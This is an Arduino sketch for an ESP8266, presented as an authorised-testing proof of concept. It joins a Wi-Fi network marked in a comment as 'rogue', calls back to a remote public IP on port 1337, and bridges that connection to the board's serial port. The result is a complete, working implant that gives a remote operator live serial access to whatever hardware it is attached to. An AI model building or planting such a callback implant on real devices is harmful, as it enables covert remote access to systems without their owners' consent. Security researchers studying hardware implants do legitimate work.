#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <ESP8266WiFiMulti.h>
#include <WiFiClient.h>

/*
Proof of concept (AUTHORIZED testing only).

ESP8266 TCP <-> UART bridge:
- Connects to a configured Wi-Fi network
- Opens a TCP connection to a remote endpoint
- Forwards data between the TCP socket and the UART (Serial)
*/

ESP8266WiFiMulti WiFiMulti;

const char* HOST = "123.123.123.123"; // REMOTE PUBLIC IP
const uint16_t PORT = 1337;           // REMOTE PORT

unsigned long lastWiFiCheck = 0;
const unsigned long wifiCheckInterval = 5000;

void setup() {
  Serial.begin(115200);
  delay(500);
  
  WiFi.mode(WIFI_STA);
  WiFi.setSleepMode(WIFI_NONE_SLEEP); // Disable sleep mode to prevent connection drops and lag
  WiFiMulti.addAP("SSID", "PASSWORD"); // ROGUE SSID/PASSWORD HERE
}

void loop() {
  static WiFiClient client;

  // Monitor WiFi connection status every 5 seconds
  if (millis() - lastWiFiCheck > wifiCheckInterval) {
    if (WiFiMulti.run() != WL_CONNECTED) {
      lastWiFiCheck = millis();
      return;
    }
    lastWiFiCheck = millis();
  }

  // Handle server connection
  if (!client.connected()) {
    client.stop();
    if (client.connect(HOST, PORT)) {
      client.setNoDelay(true); 
    } else {
      delay(2000);
      return;
    }
  }

  // DATA TRANSFER: SERVER -> SERIAL
  while (client.available() > 0) {
    uint8_t buf[256];  // Read data in chunks of 256b
    size_t len = client.read(buf, sizeof(buf));
    if (len > 0) {
      Serial.write(buf, len);
    }
    yield(); 
  }

  // DATA TRANSFER: SERIAL -> SERVER
  if (Serial.available() > 0) {
    uint8_t sBuf[256];
    size_t sLen = Serial.readBytes(sBuf, sizeof(sBuf));
    if (sLen > 0) {
      client.write(sBuf, sLen);
      // Ensure data is sent immediately
      client.flush(); 
    }
  }

  yield();
}